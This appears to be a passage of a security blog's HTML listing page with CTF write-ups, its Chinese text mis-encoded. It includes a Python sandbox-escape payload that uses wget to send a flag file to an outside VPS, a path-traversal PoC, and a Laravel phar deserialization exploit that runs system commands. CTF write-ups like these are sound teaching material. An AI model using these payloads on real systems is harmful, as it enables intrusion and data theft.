</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(xixi)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">50</span>):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> strs:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> check(i,s)<span style="color:#f92672">==</span><span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>			xixi<span style="color:#f92672">=</span>xixi<span style="color:#f92672">+</span>s
</span></span><span style="display:flex;"><span>			print(xixi)
</span></span></code></pre></div>
          
        </div>

        
          <div>
            <a class="read-more button" href="/posts/thinkphp3.1.3_sql_bypass/"> â†’</a>
          </div>
        
      </article>
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://vuln.top/posts/guanan2021wp/">è§‚å®‰CTF 2021 WriteUp</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2021-09-05 ::
            </time>
          
          
            <span class="post-author">Ca1s1</span>
          
        </div>

        
          <span class="post-tags">
            
            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
            
            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
            
          </span>
        

        


        <div class="post-content">
          
            <h1 id="web">WEB</h1>
<h2 id="baby-calc">Baby Calc</h2>
<blockquote>
<p>é€šè¿‡æµ‹è¯•å‘ç°è¯¥ç¯å¢ƒä¸ºpython3æ²™ç›’é€ƒé€¸
é€šè¿‡ç½‘ä¸Šå…¬å¼€çš„POCå‘ç°å­˜åœ¨ä»£ç æ‰§è¡Œï¼Œä½†æ˜¯æ— æ³•å›æ˜¾
å°è¯•åå¼¹SHELLå‡å¤±è´¥
å‘ç°ç³»ç»Ÿä¸å­˜åœ¨curlå‘½ä»¤ï¼Œä½†å­˜åœ¨wgeté€šè¿‡wgetå‘½ä»¤æºå¸¦å›æ˜¾å¸¦å‡ºåˆ°vps</p>
</blockquote>
<p>å¦‚ä¸‹å›¾ä½¿ç”¨wgetï¼ŒæŠŠå‘½ä»¤åŒ…å«åœ¨``ä¸­åœ¨ä½¿ç”¨base64å¸¦åˆ°vpsä¸­
<img src="https://h1dery.github.io/2021/09/05/16308495601985/1.png" alt="1"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>expr<span style="color:#f92672">=</span>__import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>__getattribute__(<span style="color:#e6db74">&#34;metsys&#34;</span>[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])(<span style="color:#e6db74">&#34;wget%20http://49.234.223.23:1234/1.txt?data=`cat%20/flag_is_here|grep</span><span style="color:#e6db74">%20f</span><span style="color:#e6db74">lag|base64`&#34;</span>)
</span></span></code></pre></div><p>vpsç›‘å¬ï¼š
<img src="https://h1dery.github.io/2021/09/05/16308495601985/2.png" alt="2"></p>
<h2 id="baby-web">Baby WEB</h2>
<blockquote>
<p>é¢˜ç›®æä¾›äº†æºä»£ç ï¼ŒæŸ¥çœ‹incloud.phpæ–‡ä»¶ï¼Œå‘ç°57è¡Œå­˜åœ¨file_put_contentså‡½æ•°ï¼Œä¸”passwordæœªåšé™åˆ¶ã€‚é€šè¿‡æ„é€ pocä½¿passwordé€ æˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p>
</blockquote>
<p><img src="https://h1dery.github.io/2021/09/05/16308495601985/16308507210959.jpg" alt="-w1134">
POC:<code>1|../../../../../../../../flag|</code></p>
<pre tabindex="0"><code>æ³¨å†Œä»»æ„ç”¨æˆ·åï¼Œå¯†ç ä¸ºPOCï¼Œç™»é™†å¯†ç ä¸º1ã€‚
ç™»é™†åè¿”å›flag
</code></pre><p><img src="https://h1dery.github.io/2021/09/05/16308495601985/16308507640380.jpg" alt="-w552"></p>
<h1 id="misc">Misc</h1>
<h2 id="è€ç”µè„‘çš„å†…å­˜">è€ç”µè„‘çš„å†…å­˜</h2>
<p>ç»å…¸çš„å†…å­˜å–è¯é¢˜ç›®ï¼Œé€šè¿‡imageinfoæ¥è·å–è¯¥å†…å­˜é•œåƒçš„æ‘˜è¦ä¿¡æ¯
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308508816927.jpg" alt="-w966">
æŸ¥çœ‹ç¼“å­˜åœ¨å†…å­˜ä¸­çš„æ³¨å†Œè¡¨ï¼š
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308508960121.jpg" alt="-w996">
è·å– SAM è¡¨ä¸­çš„ç”¨æˆ·ï¼š
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509103690.jpg" alt="-w1005">
æŸ¥çœ‹å†…å­˜ä¸­ç³»ç»Ÿçš„å¯†ç ï¼š
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509224912.jpg" alt="-w969">
CMD5è§£å¯†
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509294061.jpg" alt="-w909">
é€šè¿‡filescanæŸ¥æ‰¾ctfç”¨æˆ·ä¸‹çš„æ–‡ä»¶ å‘ç°1.png</p>
<pre tabindex="0"><code>volatility -f Windows\ 7-c0e05742.vmem --profile=Win7SP1x86_23418 filescan | grep ctf
</code></pre><p><img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509546496.jpg" alt="-w1002">
å°†1.png dumpä¸‹æ¥ï¼ŒæŸ¥çœ‹æ–‡ä»¶ã€‚ä¸å¯†ç ç»“åˆè·å¾—flag
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509648154.jpg" alt="-w915">
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509739729.jpg" alt="-w997">
##è¢«åŠ å¯†çš„wifi
é€šè¿‡åˆ†ææ•°æ®åŒ…å‘ç°keyä¸º88888888
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308510039551.jpg" alt="-w528">
é€šè¿‡airdecap-ngå‘½ä»¤è¾“å…¥å¯†ç è§£å¯†æ•°æ®åŒ…
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308510142741.jpg" alt="-w695">
åœ¨å·²è§£å¯†çš„æ•°æ®åŒ…ä¸­æ‰¾åˆ°flag
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308510348552.jpg" alt="-w974"></p>
<h2 id="release">release</h2>
<p>æ‹¿åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œé¦–å…ˆä½¿ç”¨<code>binwalk</code>åˆ†ç¦»æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æœ‰ç”¨ä¿¡æ¯
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308511070136.jpg" alt="-w696">
é€šè¿‡winhexä¿®æ”¹æ–‡ä»¶é«˜åº¦
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308511475227.jpg" alt="-w813">
å¾—åˆ°ä¸€åŠflag
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308511600485.jpg" alt="-w805">
ç¿»åˆ°æ–‡ä»¶åº•éƒ¨å‘ç°å¾ˆå¤š20å’Œ09ï¼Œæƒ³åˆ°é€šè¿‡äºŒè¿›åˆ¶ç”ŸæˆäºŒç»´ç ï¼Œå°†20ä¿®æ”¹ä¸º0ï¼Œ09æ”¹ä¸º1
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308512337387.jpg" alt="-w854">
ä½¿ç”¨è„šæœ¬è½¬æ¢ä¸ºå›¾ç‰‡ï¼Œå¾—åˆ°äºŒç»´ç 
<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308512567725.jpg" alt="-w826">
æ‰«æå¾—åˆ°flag</p>
          
        </div>

        
          <div>
            <a class="read-more button" href="/posts/guanan2021wp/"> â†’</a>
          </div>
        
      </article>
    
      <article class="post on-list">
        <h1 class="post-title">
          <a href="https://vuln.top/posts/hufuctfweb/">2021å¹´è™ç¬¦çº¿ä¸‹èµ›WEB</a>
        </h1>
        <div class="post-meta">
          
            <time class="post-date">
              2021-05-09 ::
            </time>
          
          
            <span class="post-author">Ca1s1</span>
          
        </div>

        
          <span class="post-tags">
            
            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
            
            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
            
            #<a href="https://vuln.top/tags/laravel/">Laravel</a>&nbsp;
            
          </span>
        

        


        <div class="post-content">
          
            <h2 id="tinypng">tinypng</h2>
<p>é¢˜ç›®æä¾›äº†æºä»£ç ï¼Œé€šè¿‡php artisan å‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯Laravel 8.15æ¡†æ¶
<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120346.png" alt="">
é¦–å…ˆæŸ¥çœ‹è·¯ç”±ä¿¡æ¯
<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120417.png" alt=""></p>
<p>å…ˆæŸ¥çœ‹ä¸€ä¸‹<code>fileupload</code>è·¯ç”±ï¼Œå¯ä»¥å‘ç°æ–‡ä»¶ä¸Šä¼ æ—¶å¯¹å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸”åªå…è®¸ä¸Šä¼ <code>png</code>
<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120443.png" alt=""></p>
<p>æ¥ç€æˆ‘ä»¬çœ‹imageè·¯ç”±ï¼Œè¿›å…¥<code>ImageController</code>ï¼Œ<code>$source</code>å¯æ§æ¥ç€åˆ¤æ–­æ˜¯å¦ä¸º<code>png</code>ç»“å°¾ï¼Œå¦‚æœä¸º<code>png</code>ç»“å°¾åˆ™ä¼ ç»™<code>imgcompress</code>ç±»ã€‚
<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120510.png" alt="">
è¿›å…¥<code>imgcompress</code>ç±»ï¼Œ<code>$this-&gt;src</code>ä¸ºæˆ‘ä»¬ä¼ å…¥çš„<code>$source</code>
<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120529.png" alt="">
æ¥ç€åˆä¼ é€’ç»™<code>compressImg</code>ç±»ï¼Œè°ƒç”¨äº†<code>openImg</code>æ–¹æ³•
<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120551.png" alt=""></p>
<p>å°†<code>$source</code>ä¼ é€’ç»™äº†<code>getimagesize</code>ï¼Œ<code>getimagesize</code>å¯ä»¥è§¦å‘<code>phar</code>ååºåˆ—åŒ–
<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120612.png" alt=""></p>
<p>ç°åœ¨åªéœ€è¦ç»•è¿‡æ–‡ä»¶ä¸Šä¼ å†…å®¹æ£€æµ‹å³å¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡gzipçš„æ–¹å¼ç»•è¿‡ã€‚
ä»ç½‘ä¸Šæ‰¾ä¸€ä¸ªLaravel 8çš„å…¬å¼€çš„ååºåˆ—åŒ–POPé“¾æ¼æ´å³å¯ï¼Œå¦‚ä¸‹ç»™å‡ºæˆ‘ä½¿ç”¨çš„expã€‚</p>
<pre tabindex="0"><code class="language-<?php" data-lang="<?php">namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events, $event) {
            $this-&gt;events = $events;
            $this-&gt;event = $event;
        }
    }

    class BroadcastEvent {
        public $connection;
        public function __construct($connection) {
            $this-&gt;connection = $connection;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;
        public function __construct($queueResolver){
            $this-&gt;queueResolver = $queueResolver;
        }
    }
}


namespace {
    $c = new Illuminate\Broadcasting\BroadcastEvent(&#39;whoami&#39;);
    $b = new Illuminate\Bus\Dispatcher(&#39;system&#39;);
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
    #print(urlencode(serialize($a)));
    @unlink(&#34;phar.phar&#34;);
    $phar=new Phar(&#34;phar.phar&#34;);
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&#39;GIF89a&#39;.&#34;__HALT_COMPILER();&#34;);
    $phar-&gt;setMetadata($a);
    $phar-&gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;);
    $phar-&gt;stopBuffering();
}
 
</code></pre><p>é€šè¿‡å¦‚ä¸Šexpç”Ÿæˆ<code>phar</code>æ–‡ä»¶ï¼Œä½¿ç”¨<code>gzip</code>æ‰“åŒ…ä¿®æ”¹ä¸ºpngåç¼€
<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120640.png" alt=""></p>
          
        </div>

        
          <div>
            <a class="read-more button" href="/posts/hufuctfweb/"> â†’</a>
          </div>
        
      </article>
    

    <div class="pagination">
  <div class="pagination__buttons">
    
    
      <a href="/posts/page/2/" class="button next">
        <span class="button__text">Older posts</span>
        <span class="button__icon">â†’</span>
      </a>
    
  </div>
</div>

  </div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Â© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
